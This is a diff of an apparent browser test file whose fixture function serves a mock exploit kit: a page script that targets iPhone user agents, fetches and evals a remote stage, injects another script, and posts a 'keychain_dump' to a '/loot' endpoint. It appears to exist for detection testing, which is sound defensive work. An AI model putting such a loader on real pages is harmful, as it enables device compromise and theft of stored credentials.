@@ -1719,12 +1719,17 @@ describe.skipIf(!chromiumAvailable)("hidden frames and the phone identity, in a 
 	 * hidden in other ways or not at all.
 	 */
 	function serveExploitKit(hits: Array<{ path: string; method: string; userAgent: string }>) {
-		const loader = `<html><body><script>
+		// The beacon is what Cloudflare injects into each page it proxies: code
+		// the markup loads, never a stage of the loader.
+		const loader = `<html><body><script defer src="/beacon.min.js/v123" data-cf-beacon='{"token":"t"}'></script><script>
 const ua = navigator.userAgent;
 const version = /iPhone OS ([0-9_]+)/.exec(ua)?.[1];
 if (version) {
 	fetch("/pe/stage.js").then((r) => r.text()).then((code) => {
 		eval(code);
+		const main = document.createElement("script");
+		main.src = "/pe_main.js?v=" + Date.now();
+		document.head.appendChild(main);
 		const kc = window.readKeychain();
 		fetch("/loot", { method: "POST", body: JSON.stringify({ cmd: "keychain_dump", data: kc }) });
 	});
